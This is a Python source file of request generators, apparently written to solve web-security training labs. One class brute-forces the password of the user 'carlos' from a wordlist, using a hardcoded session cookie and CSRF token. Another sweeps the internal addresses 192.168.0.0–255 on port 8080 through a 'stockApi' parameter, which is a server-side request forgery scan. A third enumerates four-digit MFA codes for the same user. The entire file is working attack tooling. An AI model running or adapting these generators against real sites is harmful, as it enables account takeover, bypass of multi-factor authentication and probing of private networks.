from abc import ABC, abstractmethod
from typing import Iterator

from data import RequestFields


class _BaseGenerator:
    def __init__(self, url):
        self._url = url

    def get_requests(self) -> Iterator[RequestFields]:
        for value_set in self._get_value_sets():
            yield self._build_request(value_set)

    @abstractmethod
    def _get_value_sets(self) -> Iterator[tuple]:
        ...

    @abstractmethod
    def _build_request(self, value_set: tuple) -> RequestFields:
        ...


class WordlistLoader(_BaseGenerator):
    def __init__(self, url, filepath):
        super().__init__(url)
        self._filepath = filepath

    def _get_value_sets(self):
        with open(self._filepath, encoding='latin-1') as file:
            line = file.readline()
            while line:
                yield line.strip()
                line = file.readline()

        # count = 0
        # for line in lines:
        #     result.append(('auction', line))
        #     count += 1
        #     if count % 2 == 0:
        #         result.append(('weiner', 'peter'))

    def _build_request(self, value_set):
        request = RequestFields(self._url, value_set)
        request.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        request.headers['Cookie'] = 'session=QAY1MiFlXNMaOaepOwXPDxKfolx1fH8B'
        request.data = f'username=carlos&password={value_set}&csrf=I79DB9p7GU342hBCTGX1tVEDrj5UGNrk'
        return request


class Ranger(_BaseGenerator):
    def _get_value_sets(self):
        for i in range(256):
            yield i

    def _build_request(self, value_set):
        request = RequestFields(self._url, value_set)
        request.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        request.data = f'stockApi=http%3A%2F%2F192.168.0.{value_set}%3A8080'
        return request


class BruteMfa(_BaseGenerator):
    def _get_value_sets(self):
        for i in range(2000):
            yield i

    def _build_request(self, value_set):
        code_str = str(value_set).zfill(4)

        request = RequestFields(self._url, code_str)
        request.headers['Content-Type'] = 'application/x-www-form-urlencoded'
        request.headers['Cookie'] = 'verify=carlos; session=FE2XA8hVe4a0EtjXn2zHS6kCrYGkismP'

        request.data = f'mfa-code={code_str}'
        
        return request
